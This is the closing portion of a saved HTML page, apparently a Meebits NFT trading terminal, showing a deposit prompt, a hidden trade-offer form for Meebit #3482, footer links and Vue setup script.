bg-green-100"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" class="h-3 w-3 text-green-600"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg></div></span> <div class="p-4 text-center"><h3 class="text-gray-900 text-xl font-medium">#3482</h3></div></div></li> <!----></ul></div> 
                
                <div class="bg-yellow-50 shadow sm:rounded-lg" style="display: none;" id="deposit"><div class="px-4 py-5 sm:p-6"><h3 class="text-lg leading-6 font-medium text-gray-900">
                                    Deposit Required
                                </h3> <div class="mt-2 max-w-xl text-sm text-gray-500"><p>
                                        Your current balance in the Meebits contract of 0 ETH is not enough to fund this trade. You must deposit 3 ETH to be able to submit this trade.
                                    </p></div> <div class="mt-5">
                                        
                                <div class="rounded-md bg-red-50 p-4 mb-4" style="display: none;"><div class="flex"><div class="flex-shrink-0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-5 w-5 text-red-400"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path></svg></div> <div class="ml-3"><h3 class="text-sm font-medium text-red-800">
                                                    
                                                </h3></div></div></div> <button type="button" onclick="deposit()" class="inline-flex items-center justify-center px-4 py-2 border border-transparent font-medium rounded-md text-yellow-700 bg-yellow-100 hover:bg-yellow-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-500 sm:text-sm"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" class="mr-2 animate-spin h-6 w-6 text-yellow-400" style="display: none;"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" class="opacity-25"></circle> <path fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" class="opacity-75"></path></svg>

                                        Make Deposit
                                    </button></div></div></div> 
                                    <div class="flex items-start"><div class="flex items-center h-5">
                                        <input id="agree_terms" name="agree_terms" type="checkbox" class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded"></div> 
                                        <div class="ml-3 text-sm">
                                            <label for="agree_terms" class="font-medium text-gray-700">I agree to the following <a href="https://meebits.larvalabs.com/meebits/termsandconditions" target="_blank" class="font-semibold text-indigo-700 hover:text-indigo-500">terms and conditions</a></label> 
                                            <p class="text-gray-500">By performing this transaction you agree to the terms and conditions.</p>
                                        </div>
                                    </div>
                                </div> 
                                <div class="px-4 py-3 bg-gray-50 text-right sm:px-6">
                                    <form method="POST" id="deal_form" action="https://meebits.larvalabs.com/meebits/submitoffer">
                                        <input type="hidden" name="hash" value=""> 
                                        <input type="hidden" name="maker" value="0xE00FF3dc325f1917A664D23052c594e4F62184d9"> 
                                        <input type="hidden" name="taker" value="0x671675Ee5A9eBc55C0409A00c0ea09c5D30a1e9C"> 
                                        <input type="hidden" name="makerWei" value="3000000000000000000"> 
                                        <input type="hidden" name="makerIds"> <input type="hidden" name="takerWei" value="0"> 
                                        <input type="hidden" name="takerIds" value="3482"> 
                                        <input type="hidden" name="salt" value="2864955131"> 
                                        <input type="hidden" name="expirySeconds" value="1641491212"> 
                                        <input type="hidden" name="sig" value="">
                                    </form> 
                                <button onclick="makeDeposit()" type="button" id="buyBtn" disabled="disabled" class="inline-flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 disabled:opacity-50">
                                    Approve and Sign Trade
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>



<script type="text/javascript" language="javascript" src="./Meebits Trading Terminal2 (Beta)_files/humanize-duration.js"></script>

    
            </div>
        </main>
    </div>

    <!-- This example requires Tailwind CSS v2.0+ -->
    <footer class="bg-white">
        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 md:flex md:items-center md:justify-between lg:px-8">
            <div class="flex justify-center space-x-6 md:order-2">

                <a href="https://twitter.com/larvalabs" class="text-gray-400 hover:text-gray-500">
                    <span class="sr-only">Twitter</span>
                    <svg class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                        <path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path>
                    </svg>
                </a>


                <a href="https://discord.gg/tQp4pSE" class="text-gray-400 hover:text-gray-500">
                    <span class="sr-only">Discord</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8h2a2 2 0 012 2v6a2 2 0 01-2 2h-2v4l-4-4H9a1.994 1.994 0 01-1.414-.586m0 0L11 14h4a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2v4l.586-.586z"></path>
                    </svg>
                </a>

            </div>
            <div class="mt-8 md:mt-0 md:order-1">
                <p class="text-center text-base text-gray-400">
                    © 2021 Larva Labs LLC. All rights reserved.
                </p>
                <p class="text-center text-base text-gray-400">
                    <a class="" href="https://meebits.larvalabs.com/meebits/termsandconditions">Terms and Conditions</a> · <a class="" href="https://meebits.larvalabs.com/meebits/privacypolicy">Privacy Policy</a>
                </p>
            </div>
        </div>
    </footer>


    <script src="./Meebits Trading Terminal2 (Beta)_files/jquery-1.6.4.min.js" type="text/javascript" charset="utf-8"></script>
        
        <script type="text/javascript">
            window.addEventListener('DOMContentLoaded', function() {
                Project3.init("0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", "0xd4e4078ca3495DE5B1d4dB434BEbc5a986197782", "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7", "https://eth-mainnet.alchemyapi.io/v2/N60iHye4vevFlWiz_HUhTWYqRQOBcoKt", false);

                var shortAddressFunction = function () {
                    if (this.state.account) {
                        return this.state.account.substring(0, 10);
                    } else {
                        return "";
                    }
                }

                var hasContractBalanceFunction = function () {
                    return this.state.accountBalanceInWei > 0;
                }

                var activityDropdown = new Vue({
                    el: '#activity_dropdown',
                    data: {
                        showing: false
                    },
                    computed: {
                        shortAddress: shortAddressFunction,
                        hasAccountBalance: hasContractBalanceFunction,
                    },
                    methods: {
                        toggleDropdown: function () {
                            this.showing = !this.showing;
                        },
                    }
                });

                var accountVue = new Vue({
                    el: '#profile_medium',
                    data: {
                        state: Project3.state,
                    },
                    computed: {
                        shortAddress: shortAddressFunction,
                        hasAccountBalance: hasContractBalanceFunction,
                        accountNeedsUnlock: Project3.shouldShowUnlockAccountMessageFunc,
                    }
                });

                var accountMobileVue = new Vue({
                    el: '#profile_mobile',
                    data: {
                        state: Project3.state,
                    },
                    computed: {
                        shortAddress: shortAddressFunction,
                        hasAccountBalance: hasContractBalanceFunction,
                        accountNeedsUnlock: Project3.shouldShowUnlockAccountMessageFunc,
                    }
                });
            });
        </script>
    
</body></html>
